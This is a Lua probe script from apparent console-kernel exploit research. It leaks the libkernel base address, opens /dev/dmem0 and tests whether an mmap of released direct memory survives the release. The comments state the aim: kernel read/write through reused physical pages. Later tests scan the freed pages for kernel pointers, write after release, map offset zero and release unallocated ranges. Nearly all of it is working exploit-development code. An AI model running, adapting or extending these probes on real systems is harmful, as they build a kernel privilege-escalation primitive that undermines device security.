-- CRASH_CLASS: MODERATE
-- PROBE 553e: Does mmap survive ReleaseDirectMemory?
--
-- If yes: released physical pages might get reused for kernel structures
-- while our mmap still points to them → kernel R/W.
--
-- Test: alloc → mmap → write marker → release → pcall read → check marker

print("=== PROBE 553e: Release + mmap survival test ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive()
    local ok, v = pcall(function() return native.fcall_with_rax(stub, 20) end)
    return ok and N(v) == pid
end

local sa_buf = memory.alloc(0x20)
pcall(function() memory.write_qword(N(sa_buf), uint64(1)) end)
pcall(function() mk(416)(uint64(12), sa_buf, uint64(0)) end)
pcall(function() mk(416)(uint64(13), sa_buf, uint64(0)) end)

local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib) end)
local lk_lo = rd(N(ib) + 0x108) or 0
local lk_hi = rd(N(ib) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
local lk = uint64(string.format("0x%X%08X", lk_hi, lk_lo))
print(string.format("libkernel=0x%X%08X", lk_hi, lk_lo))

local alloc_fn = lk + uint64(0x17EF0)
local release_fn = lk + uint64(0x18360)
local sc_mmap = mk(477)
local sc_munmap = mk(73)
local sc_open = mk(5)

-- Open dmem0
local devpath = memory.alloc(32)
local path = "/dev/dmem0"
for i = 1, #path do wd(N(devpath) + i - 1, string.byte(path, i)) end
wd(N(devpath) + #path, 0)
local ok_o, fd_raw = pcall(function()
    return sc_open(uint64(N(devpath)), uint64(2), uint64(0))
end)
local dmem_fd = ok_o and N(fd_raw) or -1
print(string.format("dmem0 fd: %d", dmem_fd))
if dmem_fd < 0 then print("FAIL: open dmem0"); return end

-- ============ Test 1: Basic release lifecycle ============
print("")
print("=== TEST 1: alloc → mmap → write → release → read ===")

-- Allocate 16KB
local phys_out = memory.alloc(16)
wq(N(phys_out), uint64(0))
pcall(function()
    native.fcall_with_rax(alloc_fn, 0,
        uint64(0), uint64("0x150000000"),
        uint64(0x4000), uint64(0x4000),
        uint64(0), uint64(N(phys_out)))
end)
local phys = rq(N(phys_out))
print(string.format("  phys: %s", fmt(phys)))

-- mmap it
local ok_m, map = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(dmem_fd), phys)
end)
local map_base = ok_m and N(map) or 0
print(string.format("  mmap: %s", fmt(map)))

-- Write marker
wq(map_base, uint64("0xDEADBEEFCAFEBABE"))
wq(map_base + 8, uint64("0x1122334455667788"))
local pre1 = rq(map_base)
local pre2 = rq(map_base + 8)
print(string.format("  pre-release [0]: %s", fmt(pre1)))
print(string.format("  pre-release [8]: %s", fmt(pre2)))
print("  alive pre-release: " .. tostring(alive()))

-- Release
local ok_r, rv_r = pcall(function()
    return native.fcall_with_rax(release_fn, 0,
        phys, uint64(0x4000),
        uint64(0), uint64(0), uint64(0), uint64(0))
end)
print(string.format("  release rv: %d", ok_r and N(rv_r) or -999))
print("  alive post-release: " .. tostring(alive()))

-- Try to read through the mapping (pcall to catch crash)
local post_ok1, post_v1 = pcall(function() return memory.read_qword(map_base) end)
local post_ok2, post_v2 = pcall(function() return memory.read_qword(map_base + 8) end)

print(string.format("  post-release read1: ok=%s val=%s",
    tostring(post_ok1), post_ok1 and fmt(post_v1) or "CRASH"))
print(string.format("  post-release read2: ok=%s val=%s",
    tostring(post_ok2), post_ok2 and fmt(post_v2) or "CRASH"))

if post_ok1 and post_v1 then
    if fmt(post_v1) == "0xDEADBEEFCAFEBABE" then
        print("  *** MARKER INTACT — mmap survives release! ***")
    else
        print("  *** MARKER CHANGED — page was reused! ***")
        -- Scan for kernel pointers
        for i = 0, 0x3FF8, 8 do
            local v = rq(map_base + i)
            if v then
                local h, l = get_hi_lo(v)
                if h < 0 then h = h + 0x100000000 end
                if h >= 0xFFFF8000 and h < 0xFFFFFFFF then
                    local exp = math.floor(h / 0x100000) % 0x800
                    if exp ~= 0x7FF then
                        print(string.format("    KPTR at +0x%X: %s", i, fmt(v)))
                    end
                end
            end
        end
    end
end

-- Try to write after release
if post_ok1 then
    local write_ok = pcall(function() memory.write_qword(map_base, uint64("0xAAAABBBBCCCCDDDD")) end)
    print(string.format("  post-release write: %s", write_ok and "OK" or "FAILED"))
    if write_ok then
        local verify = rq(map_base)
        print(string.format("  post-release verify: %s", fmt(verify)))
    end
end

-- ============ Test 2: Does mmap at offset 0 work without alloc? ============
print("")
print("=== TEST 2: mmap without AllocateDirectMemory ===")
local ok_m2, map2 = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(1), uint64(dmem_fd), uint64(0))
end)
if ok_m2 and map2 then
    local h = get_hi_lo(map2)
    if h < 0 then h = h + 0x100000000 end
    if h ~= 0xFFFFFFFF then
        print(string.format("  mmap(offset=0): %s OK", fmt(map2)))
        local v0 = rq(N(map2))
        print(string.format("  first qword: %s", fmt(v0)))
        pcall(function() sc_munmap(map2, uint64(0x4000)) end)
    else
        print("  mmap(offset=0): FAILED")
    end
end

-- ============ Test 3: Release something we didn't allocate ============
print("")
print("=== TEST 3: Release unallocated range ===")
if alive() then
    local ok_r3, rv_r3 = pcall(function()
        return native.fcall_with_rax(release_fn, 0,
            uint64(0), uint64(0x4000),
            uint64(0), uint64(0), uint64(0), uint64(0))
    end)
    print(string.format("  release(0, 0x4000): %s",
        ok_r3 and fmt(rv_r3) or "crash"))
end

-- ============ Test 4: Alloc → release → re-alloc same address? ============
print("")
print("=== TEST 4: Alloc → release → re-alloc ===")
if alive() then
    -- Alloc
    wq(N(phys_out), uint64(0))
    pcall(function()
        native.fcall_with_rax(alloc_fn, 0,
            uint64(0), uint64("0x150000000"),
            uint64(0x4000), uint64(0x4000),
            uint64(0), uint64(N(phys_out)))
    end)
    local p1 = rq(N(phys_out))
    print(string.format("  alloc1: %s", fmt(p1)))

    -- Release
    pcall(function()
        native.fcall_with_rax(release_fn, 0,
            p1, uint64(0x4000),
            uint64(0), uint64(0), uint64(0), uint64(0))
    end)

    -- Re-alloc
    wq(N(phys_out), uint64(0))
    pcall(function()
        native.fcall_with_rax(alloc_fn, 0,
            uint64(0), uint64("0x150000000"),
            uint64(0x4000), uint64(0x4000),
            uint64(0), uint64(N(phys_out)))
    end)
    local p2 = rq(N(phys_out))
    print(string.format("  alloc2: %s %s", fmt(p2),
        fmt(p1) == fmt(p2) and "(SAME ADDR)" or "(DIFFERENT ADDR)"))
end

print("")
print("alive=" .. tostring(alive()))
print("DONE")
